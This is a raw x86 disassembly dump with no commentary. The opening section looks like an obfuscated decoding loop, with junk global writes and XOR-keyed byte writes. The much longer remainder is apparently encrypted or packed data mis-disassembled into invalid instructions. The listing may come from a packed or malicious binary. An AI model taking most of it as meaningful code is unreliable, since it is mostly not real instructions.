  4039f7:	and    DWORD PTR ds:0x426e99,0x0
  403a01:	jmp    0x403a13
  403a06:	mov    edx,DWORD PTR ds:0x426e99
  403a0c:	inc    edx
  403a0d:	mov    DWORD PTR ds:0x426e99,edx
  403a13:	cmp    DWORD PTR ds:0x426e99,0x1a
  403a1a:	jae    0x403a48
  403a20:	cmp    DWORD PTR ds:0x426e99,0x24
  403a27:	jle    0x403a48
  403a2d:	jmp    0x403a43
  403a32:	push   DWORD PTR [ebp-0x20]
  403a35:	push   DWORD PTR [ebp-0xc]
  403a38:	push   0x18cc
  403a3d:	call   DWORD PTR ds:0x430a18
  403a43:	jmp    0x403a06
  403a48:	mov    DWORD PTR [ebp-0x14],ecx
  403a4b:	dec    DWORD PTR ds:0x426e89
  403a51:	mov    edx,DWORD PTR [ebp-0x14]
  403a54:	or     DWORD PTR ds:0x426f29,0x426e89
  403a5e:	xor    edx,esi
  403a60:	xor    DWORD PTR ds:0x426ed9,0x426ed5
  403a6a:	add    edx,0x7f55d8fb
  403a70:	lea    ecx,[ebp+eax*4-0xb4]
  403a77:	mov    DWORD PTR ds:0x426e81,0x3e21
  403a81:	mov    DWORD PTR [ecx],edx
  403a83:	mov    DWORD PTR ds:0x426ecd,0x70c2
  403a8d:	mov    edx,DWORD PTR [ecx]
  403a8f:	cmp    edx,0x244ecb9a
  403a95:	jbe    0x403ab0
  403a9b:	add    DWORD PTR ds:0x426edd,0x36b2
  403aa5:	add    DWORD PTR [ecx],0x405fcd9
  403aab:	jmp    0x403ab6
  403ab0:	add    DWORD PTR [ecx],0xfdaf4327
  403ab6:	mov    ecx,DWORD PTR [ebp-0x18]
  403ab9:	xor    ecx,esi
  403abb:	sbb    DWORD PTR ds:0x426f11,0x426ef1
  403ac5:	inc    eax
  403ac6:	inc    DWORD PTR [ebp-0x14]
  403ac9:	sbb    DWORD PTR ds:0x426eb1,0x426ef5
  403ad3:	add    ecx,edi
  403ad5:	mov    DWORD PTR ds:0x426ee5,0x502
  403adf:	cmp    eax,ecx
  403ae1:	jb     0x403a4b
  403ae7:	mov    eax,ds:0x426f1d
  403aec:	xor    DWORD PTR ds:0x426ee9,eax
  403af2:	mov    dl,BYTE PTR [ebp-0x21]
  403af5:	add    eax,DWORD PTR ds:0x426ea1
  403afb:	mov    eax,DWORD PTR [ebp-0x34]
  403afe:	xor    al,0xb3
  403b00:	not    DWORD PTR ds:0x426f0d
  403b06:	mov    cl,0x6
  403b08:	sub    cl,al
  403b0a:	add    dl,cl
  403b0c:	sub    DWORD PTR ds:0x426ed9,0x16fc
  403b16:	mov    ecx,DWORD PTR [ebp-0x1c]
  403b19:	xor    cl,0xb3
  403b1c:	sub    cl,0x6
  403b1f:	ror    dl,cl
  403b21:	xor    eax,eax
  403b23:	or     eax,eax
  403b25:	mov    eax,DWORD PTR [ebp-0xc]
  403b28:	mov    BYTE PTR [eax+ebx*1+0x801],dl
  403b2f:	mov    eax,DWORD PTR [ebp-0xc]
  403b32:	mov    ecx,DWORD PTR [ebp-0x28]
  403b35:	xor    DWORD PTR ds:0x426f11,0x426f09
  403b3f:	sub    eax,edi
  403b41:	xor    DWORD PTR ds:0x426eb5,0x426efd
  403b4b:	xor    eax,esi
  403b4d:	cmp    eax,ecx
  403b4f:	jne    0x403b79
  403b55:	mov    eax,DWORD PTR [ebp-0x8]
  403b58:	mov    ecx,DWORD PTR [ebp-0x10]
  403b5b:	xor    eax,esi
  403b5d:	xor    ecx,esi
  403b5f:	sub    eax,ecx
  403b61:	sub    eax,edi
  403b63:	xor    eax,esi
  403b65:	mov    DWORD PTR [ebp-0x8],eax
  403b68:	mov    eax,DWORD PTR [ebp-0x10]
  403b6b:	xor    eax,esi
  403b6d:	mov    ecx,0xffcd8d87
  403b72:	sub    ecx,eax
  403b74:	jmp    0x403b88
  403b79:	mov    eax,DWORD PTR [ebp-0x10]
  403b7c:	xor    eax,esi
  403b7e:	mov    ecx,0xffcd8d06
  403b83:	sub    ecx,eax
  403b85:	add    ecx,DWORD PTR [ebp-0xc]
  403b88:	mov    DWORD PTR [ebp-0xc],ecx
  403b8b:	mov    eax,DWORD PTR [ebp-0x8]
  403b8e:	cmp    eax,0xf89c85b5
  403b93:	jne    0x40140a
  403b99:	mov    DWORD PTR [ebp-0x34],0xb
  403ba0:	mov    ecx,DWORD PTR [ebp+0x8]
  403ba3:	xor    ecx,esi
  403ba5:	add    ecx,edi
  403ba7:	jmp    0x408537
  403bac:	lea    eax,[ecx+ebx*1]
  403baf:	jmp    0x405f47
  403bb4:	lock and dl,ch
  403bb7:	pop    ebp
  403bb8:	pop    ecx
  403bb9:	ins    BYTE PTR es:[edi],dx
  403bba:	js     0x403bf2
  403bbc:	mov    ds:0xe9c4e32d,al
  403bc1:	or     esp,DWORD PTR [ecx+0x17]
  403bc4:	hlt    
  403bc5:	pushf  
  403bc6:	jnp    0x403c43
  403bc8:	hlt    
  403bc9:	pushf  
  403bca:	jnp    0x403c47
  403bcc:	loope  0x403b7e
  403bce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bcf:	mov    ebp,0x34c4a9b5
  403bd4:	call   0x51bf0723
  403bd9:	(bad)  
  403bda:	out    dx,al
  403bdb:	sbb    BYTE PTR [esi],ch
  403bdd:	shr    DWORD PTR [esp+esi*2-0x23],cl
  403be1:	or     dh,BYTE PTR [esp-0x44]
  403be5:	pop    edx
  403be6:	ss mov dh,0x59
  403be9:	xor    DWORD PTR [esi+0x29],ebp
  403bec:	fstp   st(6)
  403bee:	pop    eax
  403bef:	inc    esp
  403bf0:	jmp    DWORD PTR [edi+0x45]
  403bf3:	test   DWORD PTR [ebx-0xd8f56b],esp
  403bf9:	xchg   ebp,eax
  403bfa:	arpl   si,dx
  403bfc:	pushf  
  403bfd:	shl    DWORD PTR [edx-0x7d],1
  403c00:	xchg   ebx,eax
  403c01:	repz cs jne 0x403c6c
  403c05:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c06:	stos   DWORD PTR es:[edi],eax
  403c07:	lds    ebx,FWORD PTR [eax]
  403c09:	loopne 0x403be6
  403c0b:	jmp    0x403be3
  403c0d:	sbb    eax,0x36d9f01e
  403c12:	je     0x403bbc
  403c14:	cmp    bh,BYTE PTR [eax]
  403c16:	xchg   edx,eax
  403c17:	loope  0x403bfc
  403c19:	push   esi
  403c1a:	mov    edx,0xb840141b
  403c1f:	fdivr  st,st(5)
  403c21:	sub    al,0xc1
  403c23:	and    dh,BYTE PTR [eax-0x1b]
  403c26:	jbe    0x403c77
  403c28:	inc    ebp
  403c29:	lds    eax,FWORD PTR [ebx+ebp*4+0x7f987cef]
  403c30:	mov    ecx,0x388619bb
  403c35:	and    DWORD PTR [edx-0x66890acf],eax
  403c3b:	xor    DWORD PTR [edi+0x7c170062],0xb6d0f658
  403c45:	test   eax,0x9b407130
  403c4a:	push   ds
  403c4b:	iret   
  403c4c:	les    eax,FWORD PTR [edi-0x50]
  403c4f:	inc    eax
  403c50:	mov    edi,0xb166b3b0
  403c55:	adc    al,0x7
  403c57:	mov    BYTE PTR [eax+0x39f64083],bl
  403c5d:	in     al,0x45
  403c5f:	aas    
  403c60:	ret    0xa078
  403c63:	xchg   DWORD PTR [eax+0x16],eax
  403c66:	icebp  
  403c67:	dec    esi
  403c68:	mov    ds:0x277f23b9,al
  403c6d:	fild   DWORD PTR [ecx+0x43937ddf]
  403c73:	jp     0x403c0c
  403c75:	jne    0x403c1b
  403c77:	mov    al,0x15
  403c79:	mov    eax,0xc8306e3c
  403c7e:	shl    BYTE PTR [esi-0x404aed1],cl
  403c84:	jne    0x403c99
  403c86:	rep lods eax,DWORD PTR ds:[esi]
  403c88:	lods   eax,DWORD PTR ds:[esi]
  403c89:	dec    eax
  403c8a:	stc    
  403c8b:	loopne 0x403c91
  403c8d:	call   0x3583:0x62de078e
  403c94:	loope  0x403d05
  403c96:	cli    
  403c97:	popa   
  403c98:	mov    ah,0x74
  403c9a:	pop    es
  403c9b:	test   DWORD PTR [ebx+0x10],esp
  403c9e:	jle    0x403d0c
  403ca0:	dec    bx
  403ca2:	pop    edi
  403ca3:	mov    DWORD PTR [edx+0x37],ebp
  403ca6:	push   ss
  403ca7:	add    eax,0xd3493d4d
  403cac:	or     bh,al
  403cae:	(bad)  
  403caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cb0:	outs   dx,BYTE PTR ds:[esi]
  403cb1:	(bad)  
  403cb3:	inc    esp
  403cb4:	out    0xa4,al
  403cb6:	and    BYTE PTR [esi+0x5955a923],0xbb
  403cbd:	mov    dl,0xce
  403cbf:	(bad)  
  403cc0:	jae    0x403d30
  403cc2:	jns    0x403d11
  403cc4:	jns    0x403cda
  403cc6:	aaa    
  403cc7:	sar    DWORD PTR [ecx-0x5218bb61],1
  403ccd:	aad    0x20
  403ccf:	pop    eax
  403cd0:	(bad)  
  403cd1:	xor    BYTE PTR [edx+0x47021a2e],ah
  403cd7:	mov    ecx,0x82ab4937
  403cdc:	lods   eax,DWORD PTR ds:[esi]
  403cdd:	and    eax,0xc9d3c297
  403ce2:	adc    BYTE PTR [edx],0xf4
  403ce5:	add    eax,0x74fb8e36
  403cea:	push   esp
  403ceb:	std    
  403cec:	mov    gs,WORD PTR [ecx+eiz*4]
  403cef:	xchg   BYTE PTR [edi-0x2b0cd80a],bl
  403cf5:	repz jbe 0x403cb1
  403cf8:	pop    es
  403cf9:	sbb    edx,DWORD PTR [edi+0x219a7a4f]
  403cff:	mov    ebp,0xaa2e2eaf
  403d04:	jl     0x403cce
  403d06:	xor    dl,BYTE PTR [edi]
  403d08:	(bad)  
  403d09:	sar    DWORD PTR [edi],1
  403d0b:	adc    bh,dh
  403d0d:	add    DWORD PTR [eax+ebx*8+0x1],0x1e
  403d12:	inc    ebp
  403d13:	mov    ebp,0xfc790188
  403d18:	rol    ebp,cl
  403d1a:	mov    cl,BYTE PTR [eax-0x6fc4f467]
  403d20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d21:	loopne 0x403d47
  403d23:	inc    edx
  403d24:	lods   al,BYTE PTR ds:[esi]
  403d25:	cmp    ebx,esp
  403d27:	cmc    
  403d28:	and    esp,DWORD PTR [eax+0x5d]
  403d2b:	mov    cl,0x6c
  403d2d:	or     al,0xab
  403d2f:	add    DWORD PTR [ebx],eax
  403d31:	cmc    
  403d32:	jg     0x403ccb
  403d34:	test   BYTE PTR ds:0xb35b657f,dh
  403d3a:	and    dh,BYTE PTR [ebx-0x3e]
  403d3d:	test   ecx,0x803397f9
  403d43:	(bad)  [eax]
  403d45:	data16 into 
  403d47:	nop
  403d48:	adc    bl,BYTE PTR [esi+0x4d06826c]
  403d4e:	jmp    0xf28:0x80d5785d
  403d55:	stos   DWORD PTR es:[edi],eax
  403d56:	cmp    BYTE PTR [edx+0x44acb5ad],ah
  403d5c:	stc    
  403d5d:	retf   0x1aaf
  403d60:	mov    esi,0x4b3c675d
  403d65:	inc    esi
  403d66:	or     al,0x88
  403d68:	(bad)  
  403d69:	fistp  DWORD PTR [edi]
  403d6b:	stos   DWORD PTR es:[edi],eax
  403d6c:	or     DWORD PTR [ebx+ecx*8+0x3c],eax
  403d70:	push   ecx
  403d71:	cs push ebx
  403d73:	sahf   
  403d74:	out    0xe2,eax
  403d76:	mov    ah,0xc5
  403d78:	arpl   WORD PTR [ebx],di
  403d7a:	xchg   ebp,eax
  403d7b:	dec    esp
  403d7c:	nop
  403d7d:	fistp  WORD PTR [eax+ecx*2+0x1cc395ee]
  403d84:	sbb    DWORD PTR [eax-0x65],0x10
  403d88:	push   edi
  403d89:	retf   0x64b0
  403d8c:	jl     0x403d79
  403d8e:	inc    edx
  403d8f:	gs (bad) 
  403d91:	cli    
  403d92:	in     eax,0xd5
  403d94:	push   0xcd30b132
  403d99:	and    esi,DWORD PTR [esi-0x4b]
  403d9c:	inc    ecx
  403d9d:	stos   DWORD PTR es:[edi],eax
  403d9e:	pop    es
  403d9f:	pop    eax
  403da0:	add    edi,DWORD PTR [esi+0x25941c31]
  403da6:	inc    esi
  403da7:	inc    esi
  403da8:	mov    al,0x79
  403daa:	jg     0x403dee
  403dac:	inc    edx
  403dad:	mov    ch,0x8e
  403daf:	ret    0xdbf2
  403db2:	xlat   BYTE PTR ds:[ebx]
  403db3:	repnz cmp eax,DWORD PTR cs:[esi-0x74]
  403db8:	mov    ebx,0xa28a2502
  403dbd:	pop    ss
  403dbe:	jp     0x403e21
  403dc0:	cli    
  403dc1:	xchg   ebx,eax
  403dc2:	push   0x4d962b75
  403dc7:	shr    BYTE PTR [edx-0x1d],1
  403dca:	jmp    DWORD PTR [esi]
  403dcc:	inc    esp
  403dcd:	mov    ecx,0xbb327abb
  403dd2:	jmp    0x403e40
  403dd4:	stos   DWORD PTR es:[edi],eax
  403dd5:	test   al,0xce
  403dd7:	or     DWORD PTR [edi+edx*4],eax
  403dda:	aam    0x3d
  403ddc:	mov    DWORD PTR [edi+0x5d],esp
  403ddf:	jle    0x403df2
  403de1:	xor    BYTE PTR [bp+si-0x56e0],dh
  403de6:	push   cs
  403de7:	mov    eax,ds:0x901b9c0e
  403dec:	aaa    
  403ded:	test   edi,0xe2af8a5
  403df3:	and    BYTE PTR [ecx+0x609e3f4f],0x10
  403dfa:	repz neg ebx
  403dfd:	mov    esp,0x7372f9dd
  403e02:	add    bl,ch
  403e04:	mov    ah,0x57
  403e06:	xchg   esp,eax
  403e07:	clc    
  403e08:	adc    al,0xfe
  403e0a:	neg    DWORD PTR [ebp-0x79]
  403e0d:	inc    ebp
  403e0e:	pop    es
  403e0f:	mov    edi,0x6058af45
  403e14:	inc    edx
  403e15:	daa    
  403e16:	cmp    ch,BYTE PTR [esi-0x7f5a2f49]
  403e1c:	adc    ch,BYTE PTR [esi]
  403e1e:	loopne 0x403df2
  403e20:	dec    ebp
  403e21:	dec    ecx
  403e22:	mov    ds:0xc16e1a1d,eax
  403e27:	xchg   edi,eax
  403e28:	jae    0x403e84
  403e2a:	pushf  
  403e2b:	je     0x403e09
  403e2d:	dec    esp
  403e2e:	adc    al,0xf1
  403e30:	mov    ds:0x7447f035,al
  403e35:	pop    edx
  403e36:	stos   BYTE PTR es:[edi],al
  403e37:	rcr    BYTE PTR [eax+0x5a01a01b],0x8e
  403e3e:	rcr    BYTE PTR [ebx+0x15],0x4c
  403e42:	inc    ebx
  403e43:	jno    0x403e1d
  403e45:	pushf  
  403e46:	or     dh,BYTE PTR [eax]
  403e48:	push   ds
  403e49:	fwait
  403e4a:	hlt    
  403e4b:	dec    ebx
  403e4c:	mov    ah,0x11
  403e4e:	fs jge 0x403df9
  403e51:	data16 clc 
  403e53:	add    BYTE PTR [esi-0x6414b96f],cl
  403e59:	mov    bl,0x9f
  403e5b:	xor    DWORD PTR [edi+0x79],edi
  403e5e:	mov    dh,0xc9
  403e60:	fld    DWORD PTR [esp+edx*8+0x10]
  403e64:	pop    ds
  403e65:	inc    ebx
  403e66:	inc    ecx
  403e67:	cmp    DWORD PTR [eax],0x57
  403e6a:	enter  0xe80e,0x95
  403e6e:	repnz ins DWORD PTR es:[edi],dx
  403e70:	inc    esi
  403e71:	pop    esi
  403e72:	jp     0x403dfe
  403e74:	bound  ebp,QWORD PTR [ecx+0x5c]
  403e77:	mov    dh,ch
  403e79:	pop    esp
  403e7a:	add    bh,dl
  403e7c:	jno    0x403e90
  403e7e:	sbb    DWORD PTR [edx],ecx
  403e80:	mov    ebp,0x2256726f
  403e85:	sbb    eax,0xa9e3c656
  403e8a:	xchg   edx,eax
  403e8b:	cmp    ah,BYTE PTR [edi+0x1736a8cc]
  403e91:	xor    esp,DWORD PTR [edx]
  403e93:	imul   edx,DWORD PTR [esi],0x7b
  403e96:	jge    0x403ecc
  403e98:	fnstcw WORD PTR [ecx-0x4b]
  403e9b:	rol    DWORD PTR [esi-0x52],0x78
  403e9f:	inc    ebp
  403ea0:	js     0x403eee
  403ea2:	out    dx,al
  403ea3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ea4:	mov    BYTE PTR ds:0xc0e76eaa,dh
  403eaa:	dec    esi
  403eab:	mov    bh,0xe
  403ead:	add    ebp,DWORD PTR [ebx]
  403eaf:	mov    gs,WORD PTR [esi+0x78]
  403eb2:	icebp  
  403eb3:	fiadd  WORD PTR [ebx]
  403eb5:	sar    dl,cl
  403eb7:	jb     0x403ec3
  403eb9:	pop    ecx
  403eba:	aaa    
  403ebb:	inc    ebp
  403ebc:	xor    esi,ebx
  403ebe:	cs stc 
  403ec0:	sub    al,0x97
  403ec2:	and    al,0x61
  403ec4:	out    0xc6,al
  403ec6:	adc    BYTE PTR [ecx-0x3c],bh
  403ec9:	push   DWORD PTR [edi]
  403ecb:	and    al,0x40
  403ecd:	mov    esp,0x564d3c3f
  403ed2:	inc    edi
  403ed3:	rcl    DWORD PTR [ebx-0x2c5633b6],cl
  403ed9:	inc    ebp
  403eda:	cld    
  403edb:	mov    gs,WORD PTR [ebx]
  403edd:	xor    bl,BYTE PTR [esi+0x766c85ce]
  403ee3:	mov    BYTE PTR [ecx+edi*2+0x39],cl
  403ee7:	mov    al,ds:0xf5dc987c
  403eec:	pop    ecx
  403eed:	xor    dh,al
  403eef:	sub    ecx,eax
  403ef1:	and    BYTE PTR [edi+0x4dd7699c],ch
  403ef7:	sub    eax,0x15bfa075
  403efc:	xor    al,BYTE PTR [ebp+0x14d7f4d4]
  403f02:	mov    ch,0xe9
  403f04:	shl    DWORD PTR [edi+0x35b5c988],cl
  403f0a:	push   edx
  403f0b:	jne    0x403ebd
  403f0d:	add    al,0x62
  403f0f:	mov    bl,0xa3
  403f11:	mov    eax,0x83f55af
  403f16:	sub    ebp,DWORD PTR [ebp+0x234e6a16]
  403f1c:	pop    ss
  403f1d:	dec    ebp
  403f1e:	fsub   st(0),st
  403f20:	sbb    ah,bh
  403f22:	(bad)  
  403f23:	neg    BYTE PTR [ebx+0x6ad794df]
  403f29:	in     al,dx
  403f2a:	push   ds
  403f2b:	call   0x8d35d257
  403f30:	mov    ds:0x5cbe0174,eax
  403f35:	test   al,0xf1
  403f37:	jmp    FWORD PTR [esi]
  403f39:	and    BYTE PTR [edx+ecx*4],bl
  403f3c:	sti    
  403f3d:	(bad)  
  403f3e:	in     al,dx
  403f3f:	inc    ecx
  403f40:	mov    ecx,0x14df9eeb
  403f45:	daa    
  403f46:	cmp    al,0x14
  403f48:	mov    BYTE PTR [esi-0x7],dl
  403f4b:	mov    esp,0x315ebe9a
  403f50:	pop    edx
  403f51:	mov    ebp,edx
  403f53:	ins    BYTE PTR es:[edi],dx
  403f54:	inc    edi
  403f55:	jbe    0x403fa2
  403f57:	jnp    0x403f5a
  403f59:	pop    eax
  403f5a:	cdq    
  403f5b:	adc    esp,0xfe59cc7
  403f61:	dec    edx
  403f62:	xor    ecx,edi
  403f64:	or     ch,BYTE PTR [ebx+0xf]
  403f67:	lds    edx,FWORD PTR [eax-0x4750e9e6]
  403f6d:	sar    al,1
  403f6f:	test   BYTE PTR [edi],ch
  403f71:	add    BYTE PTR [eax],dh
  403f73:	jle    0x403f35
  403f75:	je     0x403f88
  403f77:	xchg   ebp,eax
  403f78:	fisttp WORD PTR [edi+ebp*2-0x26514f98]
  403f7f:	call   0x947ffe36
  403f84:	outs   dx,BYTE PTR ds:[esi]
  403f85:	cmp    al,0xd1
  403f87:	xchg   esp,eax
  403f88:	dec    esp
  403f89:	xor    al,0x6
  403f8b:	sub    esp,ebx
  403f8d:	(bad)  [edi-0x7c]
  403f90:	jbe    0x403f9f
  403f92:	and    bh,BYTE PTR [edi-0x3b0c26a3]
  403f98:	fwait
  403f99:	retf   0x7480
  403f9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f9d:	adc    eax,0x492cbf46
  403fa2:	xchg   edx,eax
  403fa3:	xchg   ch,dh
  403fa5:	or     DWORD PTR [ebx],esp
  403fa7:	scas   al,BYTE PTR es:[edi]
  403fa8:	jb     0x403f6a
  403faa:	jecxz  0x403feb
  403fac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fad:	div    BYTE PTR [ecx]
  403faf:	inc    edi
  403fb0:	push   ss
  403fb1:	or     al,0x28
  403fb3:	push   ecx
  403fb4:	mov    dh,0x12
  403fb6:	inc    edx
  403fb7:	(bad)  
  403fb8:	xchg   ebx,eax
  403fb9:	fs xchg edi,eax
  403fbb:	and    al,0x4f
  403fbd:	dec    edi
  403fbe:	arpl   WORD PTR [edi+ebx*1],si
  403fc1:	sbb    ch,BYTE PTR [edi-0x73cff6b5]
  403fc7:	push   ds
  403fc8:	aam    0xc0
  403fca:	add    esi,DWORD PTR [esi]
  403fcc:	shl    DWORD PTR [ebx-0x73],0xc2
  403fd0:	push   esi
  403fd1:	or     dh,BYTE PTR [ecx+0x7c]
  403fd4:	xchg   esi,eax
  403fd5:	rcr    DWORD PTR [esi+esi*8],cl
  403fd8:	xchg   edx,eax
  403fd9:	push   esp
  403fda:	push   ss
  403fdb:	sahf   
  403fdc:	dec    esp
  403fdd:	loop   0x403ff9
  403fdf:	jle    0x403f67
  403fe1:	aaa    
  403fe2:	push   ebx
  403fe3:	adc    BYTE PTR [esi],bl
  403fe5:	cmp    DWORD PTR [esi+0x5e69c3d8],ebx
  403feb:	pop    ebx
  403fec:	shl    DWORD PTR [esi],1
  403fee:	ror    DWORD PTR [edx+0x62],cl
  403ff1:	sbb    ah,ch
  403ff3:	xchg   edx,eax
  403ff4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ff5:	mov    ch,0x95
  403ff7:	lahf   
  403ff8:	popa   
  403ff9:	dec    ecx
  403ffa:	and    DWORD PTR [ebp+ebp*4-0x6053d435],ecx
  404001:	mov    es,WORD PTR ds:[edi+0x1d431fbc]
  404008:	aam    0x42
  40400a:	cwde   
  40400b:	imul   ebx,DWORD PTR [ecx],0xfa7cab80
  404011:	or     dh,BYTE PTR [ebx]
  404013:	bnd jb 0x403ff4
  404016:	mov    ebp,0xe7c39864
  40401b:	inc    ebp
  40401c:	sbb    DWORD PTR [esi-0x318d5cca],ebx
  404022:	jmp    0xf9f9:0xcc5285e4
  404029:	sub    al,0xdf
  40402b:	mov    esi,0xa07fff42
  404030:	dec    eax
  404031:	mov    edi,0xf45ca9b
  404036:	cmp    ebx,DWORD PTR [ecx-0x57acf348]
  40403c:	outs   dx,DWORD PTR ds:[esi]
  40403d:	xchg   BYTE PTR [ebp+0x74],dh
  404040:	hlt    
  404041:	cmp    cl,ah
  404043:	mov    dl,0x9a
  404045:	dec    ecx
  404046:	add    cl,ch
  404048:	retf   
  404049:	sbb    DWORD PTR [eax+0x6],edi
  40404c:	gs loop 0x4040aa
  40404f:	fdiv   DWORD PTR [ebx-0x4fcec314]
  404055:	iret   
  404056:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404057:	jle    0x404077
  404059:	popf   
  40405a:	test   DWORD PTR [esi+ebx*1+0x1d6bb9d],eax
  404061:	push   edx
  404062:	cmp    eax,0x98d9f2b8
  404067:	push   0x71
  404069:	std    
  40406a:	inc    eax
  40406b:	in     eax,dx
  40406c:	pop    esi
  40406d:	cmc    
  40406e:	stos   BYTE PTR es:[edi],al
  40406f:	and    al,0x6b
  404071:	pop    ds
  404072:	shl    BYTE PTR [ebp+0xa],0x59
  404076:	inc    edx
  404077:	call   0x5169:0xd3713e99
  40407e:	in     al,0x87
  404080:	stc    
  404081:	sbb    al,BYTE PTR [ebp+0x24]
  404084:	xchg   cl,ch
  404086:	mov    ecx,0xa93b53fe
  40408b:	scas   eax,DWORD PTR es:[edi]
  40408c:	retf   
  40408d:	mov    edx,0x5de1fd9c
  404092:	jae    0x4040b5
  404094:	jmp    0x404096
  404096:	call   0xdda40dd1
  40409b:	adc    DWORD PTR [ebx],edx
  40409d:	das    
  40409e:	outs   dx,DWORD PTR ds:[esi]
  40409f:	ret    
  4040a0:	push   ecx
  4040a1:	fcomp  DWORD PTR [eax-0x49cb1d75]
  4040a7:	std    
  4040a8:	scas   al,BYTE PTR es:[edi]
  4040a9:	fadd   QWORD PTR [edi+ecx*1]
  4040ac:	adc    ah,ch
  4040ae:	xchg   esp,eax
  4040af:	dec    ebp
  4040b0:	mov    dl,BYTE PTR [eax-0x46a7534]
  4040b6:	sub    bl,BYTE PTR [edx]
  4040b8:	mov    ?,WORD PTR [ebx-0x11]
  4040bb:	outs   dx,BYTE PTR ds:[esi]
  4040bc:	and    BYTE PTR [eax+0x6f],cl
  4040bf:	adc    BYTE PTR [ecx-0x3fcdfed0],dl
  4040c5:	cld    
  4040c6:	arpl   ax,cx
  4040c8:	sub    ebp,eax
  4040ca:	sub    al,0xa8
  4040cc:	into   
  4040cd:	or     ebp,ecx
  4040cf:	xchg   ecx,eax
  4040d0:	and    eax,0x87b57267
  4040d5:	ror    DWORD PTR [ebp-0x559a065b],1
  4040db:	mov    ch,0xf0
  4040dd:	or     BYTE PTR [ebx+0x4c67a9f9],ah
  4040e3:	adc    ebx,DWORD PTR [edi+0x11]
  4040e6:	cmp    ebp,DWORD PTR [edx-0x55763813]
  4040ec:	xchg   edx,eax
  4040ed:	test   eax,0x5ba0fe90
  4040f2:	nop
  4040f3:	sahf   
  4040f4:	fisubr WORD PTR [edx-0x62ee7b86]
  4040fa:	aaa    
  4040fb:	(bad)  
  4040fc:	jmp    0x8ad6:0x9a1fda6f
  404103:	jg     0x40408e
  404105:	dec    eax
  404106:	xchg   esi,eax
  404107:	gs xor esp,ebp
  40410a:	call   0x7e92:0x8f58f94d
  404111:	pop    ebx
  404112:	stos   BYTE PTR es:[edi],al
  404113:	sub    BYTE PTR [ecx],cl
  404115:	clc    
  404116:	imul   ebp,DWORD PTR [ebp-0x316fda84],0x178284db
  404120:	dec    edi
  404121:	aam    0xe6
  404123:	shl    DWORD PTR [ecx+0x75],0x15
  404127:	mov    al,ds:0xcdc41784
  40412c:	int3   
  40412d:	fisttp QWORD PTR [eax]
  40412f:	ja     0x404133
  404131:	xor    BYTE PTR [edi-0x2ea4c543],dh
  404137:	push   ss
  404138:	std    
  404139:	pop    esi
  40413a:	stos   DWORD PTR es:[edi],eax
  40413b:	je     0x404171
  40413d:	mov    ebx,0xa389d14
  404142:	cmp    al,0x2e
  404144:	and    al,0x63
  404146:	icebp  
  404147:	enter  0x9806,0x93
  40414b:	repnz xor eax,0x5f52bf9d
  404151:	loope  0x4041d1
  404153:	shl    BYTE PTR [eax+0x5d],0x34
  404157:	pushf  
  404158:	jbe    0x4040f6
  40415a:	test   al,0x58
  40415c:	jge    0x40410f
  40415e:	fist   WORD PTR [ebp-0x3f59ef61]
  404164:	outs   dx,BYTE PTR ds:[esi]
  404165:	and    BYTE PTR [edx+0x73],bh
  404168:	jmp    0xc426104b
  40416d:	outs   dx,BYTE PTR ds:[esi]
  40416e:	push   eax
  40416f:	data16 ins BYTE PTR es:[edi],dx
  404171:	mov    ds:0x4f35c9e5,al
  404176:	aaa    
  404177:	jo     0x404128
  404179:	adc    al,0xdc
  40417b:	cwde   
  40417c:	psllq  mm6,QWORD PTR [eax]
  40417f:	adc    DWORD PTR [eax],esp
  404181:	popa   
  404182:	nop
  404183:	in     eax,dx
  404184:	ret    0xd1a5
  404187:	xacquire xchg DWORD PTR [eax+0x22],ebx
  40418b:	inc    ecx
  40418c:	xchg   BYTE PTR [eax],bl
  40418e:	test   DWORD PTR [edx+0x6c],esi
  404191:	vpmullw ymm4,ymm1,YMMWORD PTR [edx-0x14]
  404196:	adc    BYTE PTR [ebx-0x1b],0x73
  40419a:	mov    bl,0x7c
  40419c:	out    dx,eax
  40419d:	jae    0x4041c5
  40419f:	fimul  WORD PTR [ecx+0x1d4217cb]
  4041a5:	inc    BYTE PTR [eax-0x52]
  4041a8:	mov    al,bl
  4041aa:	aaa    
  4041ab:	inc    ebx
  4041ac:	add    DWORD PTR ds:0x8c52f12a,ebx
  4041b2:	xchg   edx,eax
  4041b3:	sub    ch,BYTE PTR [edx-0x3f0c8430]
  4041b9:	mov    ch,0xe1
  4041bb:	je     0x4041ec
  4041bd:	pushf  
  4041be:	xchg   esp,eax
  4041bf:	sub    eax,0x93093db7
  4041c4:	jae    0x4041c7
  4041c6:	fmul   QWORD PTR [edx+0x12]
  4041c9:	sub    eax,DWORD PTR [edi-0x4]
  4041cc:	inc    edi
  4041cd:	pop    eax
  4041ce:	mov    ds:0xf4261469,al
  4041d3:	inc    esp
  4041d4:	call   FWORD PTR [ebp+ebx*8+0x7ecfa5a]
  4041db:	lock int3 
  4041dd:	mov    WORD PTR [edx-0x49eef48b],gs
  4041e3:	or     BYTE PTR [edx-0x49],ch
  4041e6:	jo     0x4041ef
  4041e8:	jmp    0x4f28:0xadac20cc
  4041ef:	add    BYTE PTR [esi+0x79],dh
  4041f2:	mov    bl,0xcd
  4041f4:	sti    
  4041f5:	repz push eax
  4041f7:	into   
  4041f8:	mov    al,ds:0xef4d8e87
  4041fd:	stc    
  4041fe:	mov    ah,0xa4
  404200:	mov    ebx,0xb59ac882
  404205:	sbb    al,0xd0
  404207:	mov    bl,0x6e
  404209:	xchg   edx,eax
  40420a:	xlat   BYTE PTR ds:[ebx]
  40420b:	mov    ds:0xa0e7e830,eax
  404210:	inc    edx
  404211:	inc    esp
  404212:	ja     0x4041f6
  404214:	fstp   st(6)
  404216:	jl     0x40419a
  404218:	push   esi
  404219:	mov    al,ds:0xe6f688d6
  40421e:	dec    edi
  40421f:	retf   
  404220:	mov    dl,0xa9
  404222:	and    dl,BYTE PTR [esi-0x19]
  404225:	mov    al,0x31
  404227:	and    bl,BYTE PTR [ecx+0x6a1c814a]
  40422d:	cmp    edi,0x1f859037
  404233:	out    dx,eax
